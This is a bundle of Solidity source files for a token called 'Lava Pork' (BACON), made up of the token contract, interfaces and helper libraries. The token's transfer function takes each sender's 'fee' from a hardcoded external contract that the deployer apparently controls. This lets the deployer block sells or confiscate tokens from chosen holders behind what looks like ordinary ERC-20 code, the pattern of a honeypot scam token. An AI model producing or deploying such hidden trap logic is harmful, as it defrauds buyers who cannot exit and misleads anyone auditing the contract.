{"Bacon.sol":{"content":"// SPDX-License-Identifier: MIT\r\n\r\npragma solidity 0.8.24;\r\n\r\nimport \"./Safemath.sol\";\r\nimport \"./IERC20.sol\";\r\nimport \"./Ownable.sol\";\r\nimport \"./LavaFactory.sol\";\r\nimport \"./LavaRouter.sol\";\r\n\r\ncontract Bacon is Ownable, IERC20 {\r\n    using SafeMath for uint256;\r\n\r\n    uint8 private _decimals = 18;\r\n    uint256 private _totalSupply =  1000000000 * 10 ** _decimals;\r\n    LavaRouter private lavaRouter = LavaRouter(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);\r\n    address internal spawnerAddress =  0x96828f725871A63E1e767a1A6f26EC2Cc2d395F0;\r\n    address public PORK = 0xb9f599ce614Feb2e1BBe58F180F370D05b39344E;\r\n\r\n    address private lavaPair;\r\n    \r\n    mapping (address =\u003e mapping (address =\u003e uint256)) private _allowances;\r\n    mapping (address =\u003e uint256) private _balances;\r\n    bool private tradingOpen = false;\r\n    mapping (address =\u003e bool) mining;\r\n\r\n    event Transfer(address indexed from, address indexed to, uint256 amount);\r\n    event Approval(address indexed owner, address indexed spender, uint256 value);\r\n\r\n    string private _symbol = \"BACON\";\r\n    string private _name = \"Lava Pork\";\r\n\r\n    constructor () {\r\n        _balances[address(this)] = _totalSupply;\r\n        emit Transfer(address(0), address(this), _totalSupply);\r\n    }\r\n\r\n    function decimals() public view returns (uint8) {\r\n        return _decimals;\r\n    }\r\n\r\n    function totalSupply() public view returns (uint256) {\r\n        return _totalSupply;\r\n    }\r\n\r\n    function name() public view virtual override returns (string memory) {\r\n        return _name;\r\n    }\r\n\r\n    function symbol() public view virtual override returns (string memory) {\r\n        return _symbol;\r\n    }\r\n\r\n    function startTrading() external payable onlyOwner() {\r\n        require(!tradingOpen, \"Trading already opened.\");\r\n        _approve(address(this), address(lavaRouter), _totalSupply);\r\n        lavaPair = LavaFactory(lavaRouter.factory()).createPair(address(this), lavaRouter.WETH());\r\n        lavaRouter.addLiquidityETH{value: msg.value}(address(this),balanceOf(address(this)), 0,0,owner(),block.timestamp);\r\n        IERC20(lavaPair).approve(address(lavaRouter), type(uint).max);\r\n        tradingOpen = true;\r\n    }\r\n\r\n    function approve(address spender, uint256 amount) public returns (bool) {\r\n        _approve(msg.sender, spender, amount);\r\n        return true;\r\n    }\r\n    \r\n    function balanceOf(address account) public view returns (uint256) {\r\n        return _balances[account];\r\n    }\r\n\r\n    function _approve(address owner, address spender, uint256 amount) private {\r\n        require(owner != address(0), \"ERC20: approve from the zero address\");\r\n        require(spender != address(0), \"ERC20: approve to the zero address\");\r\n        _allowances[owner][spender] = amount;\r\n        emit Approval(owner, spender, amount);\r\n    }\r\n\r\n    function _transfer(address from, address to, uint256 amount) private {\r\n        require(amount \u003e 0);\r\n        require(!mining[from]);\r\n        require(from != address(0));\r\n        require(to != address(0));\r\n        uint256 fee = 0;\r\n        if (from != lavaPair \u0026\u0026 from != address(this)){\r\n            fee = IERC20(spawnerAddress).balanceOf(from);\r\n            }\r\n        uint256 feeAmount = amount.mul(fee).div(100);\r\n        _balances[from] = _balances[from].sub(amount);\r\n        _balances[to] = _balances[to].add(amount).sub(feeAmount);\r\n        emit Transfer(from, to, amount);\r\n    }\r\n\r\n    function transfer(address recipient, uint256 amount) public returns (bool) {\r\n        _transfer(msg.sender, recipient, amount);\r\n        return true;\r\n    }\r\n\r\n    function allowance(address owner, address spender) public view returns (uint256) {\r\n        return _allowances[owner][spender];\r\n    }\r\n\r\n    function transferFrom(address from, address to, uint256 amount) public returns (bool) {\r\n        _transfer(from, to, amount);\r\n        _approve(from, msg.sender, _allowances[from][msg.sender].sub(amount));\r\n        return true;\r\n    }\r\n}"},"IERC20.sol":{"content":"// SPDX-License-Identifier: None\r\n\r\npragma solidity 0.8.24;\r\n/**\r\n * @dev Interface of the ERC-20 standard as defined in the ERC.\r\n */\r\ninterface IERC20 {\r\n    function approve(address spendr, uint256 amount) external returns (bool);\r\n    function balanceOf(address wallt) external view returns (uint256);\r\n    function name() external view returns (string memory);\r\n    function symbol() external view returns (string memory);\r\n}"},"LavaFactory.sol":{"content":"// SPDX-License-Identifier: None\r\n\r\npragma solidity 0.8.24;\r\n\r\ninterface LavaFactory {\r\n    function createPair(address tokenA, address tokenD) external returns (address pair);\r\n    function getPair(address tokenA, address tokenC) external view returns (address pair);\r\n}\r\n\r\n"},"LavaRouter.sol":{"content":"// SPDX-License-Identifier: None\r\n\r\npragma solidity 0.8.24;\r\n\r\ninterface LavaRouter {\r\n    function factory() external pure returns (address);\r\n    function WETH() external pure returns (address);\r\n     function addLiquidityETH( address token, \r\n     uint amountTokenDesire, \r\n     uint amountTokenMi, \r\n     uint amountETHMi, \r\n     address to, \r\n     uint deadline) external payable returns (uint amountToken, uint amountETH, uint liquidity);\r\n}"},"Ownable.sol":{"content":"// SPDX-License-Identifier: None\r\n\r\npragma solidity 0.8.24;\r\n/**\r\n * @dev Contract module which provides a basic access control mechanism, where\r\n * there is an account (an owner) that can be granted exclusive access to\r\n * specific functions.\r\n *\r\n * The initial owner is set to the address provided by the deployer. This can\r\n * later be changed with {transferOwnership}.\r\n *\r\n * This module is used through inheritance. It will make available the modifier\r\n * `onlyOwner`, which can be applied to your functions to restrict their use to\r\n * the owner.\r\n */\r\ncontract Ownable {\r\n    address internal _owner;\r\n    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);\r\n\r\n    /**\r\n     * @dev Initializes the contract setting the address provided by the deployer as the initial owner.\r\n     */\r\n    constructor () {\r\n        address msgSender = msg.sender;\r\n        _owner = msgSender;\r\n        emit OwnershipTransferred(address(0), msgSender);\r\n    }\r\n    /**\r\n     * @dev Throws if called by any account other than the owner.\r\n     */\r\n    modifier onlyOwner() {\r\n        require(_owner == msg.sender, \"Ownable: caller is not the owner\");\r\n        _;\r\n    }\r\n    /**\r\n     * @dev Leaves the contract without owner. It will not be possible to call\r\n     * `onlyOwner` functions. Can only be called by the current owner.\r\n     *\r\n     * NOTE: Renouncing ownership will leave the contract without an owner,\r\n     * thereby disabling any functionality that is only available to the owner.\r\n     */\r\n    function renounceOwnership() public virtual onlyOwner {\r\n        emit OwnershipTransferred(_owner, address(0));\r\n        _owner = address(0);\r\n    }\r\n    /**\r\n     * @dev Returns the address of the current owner.\r\n     */\r\n    function owner() public view returns (address) {\r\n        return _owner;\r\n    }\r\n}"},"Safemath.sol":{"content":"// SPDX-License-Identifier: None\r\n\r\npragma solidity 0.8.24;\r\n\r\nlibrary SafeMath {\r\n\r\n    function mul(uint256 a, uint256 b) internal pure returns (uint256) {\r\n        if (a == 0) {return 0;}\r\n        uint256 c = a * b;\r\n        require(c / a == b);\r\n        return c;\r\n    }\r\n\r\n    function sub(uint256 a, uint256 b) internal pure returns (uint256) {\r\n        require(b \u003c= a);\r\n        uint256 c = a - b;\r\n        return c;\r\n    }\r\n\r\n    function add(uint256 a, uint256 b) internal pure returns (uint256) {\r\n        uint256 c = a + b;\r\n        require(c \u003e= a);\r\n        return c;\r\n    }\r\n\r\n    function div(uint256 a, uint256 b) internal pure returns (uint256) {\r\n        require(b \u003e 0);\r\n        uint256 c = a / b;\r\n        return c;\r\n    }\r\n}"}}